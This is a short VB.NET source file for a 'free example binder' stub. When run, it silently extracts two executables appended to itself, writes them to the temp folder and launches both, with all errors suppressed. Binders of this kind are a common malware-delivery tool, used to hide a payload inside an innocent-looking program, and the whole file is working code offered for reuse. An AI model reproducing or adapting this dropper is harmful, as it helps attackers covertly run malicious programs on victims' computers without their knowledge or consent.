Public Class Form1

    Const FileSplit = "(-Two-Binded-Files-From-Nathan72389s-Free-Example-Binder-)"

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim TempPath As String = System.IO.Path.GetTempPath
        Dim bfile1, bfilez() As String
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        bfile1 = Space(LOF(1))
        FileGet(1, bfile1)
        FileClose(1)
        bfilez = Split(bfile1, FileSplit)
        FileOpen(3, TempPath & "\BFile1.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, bfilez(1))
        FileClose(3)
        FileOpen(5, TempPath & "\BFile2.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(5, bfilez(2))
        FileClose(5)
        System.Diagnostics.Process.Start(TempPath & "\BFile1.exe")
        System.Diagnostics.Process.Start(TempPath & "\BFile2.exe")
        Me.Close()
        End
    End Sub
End Class
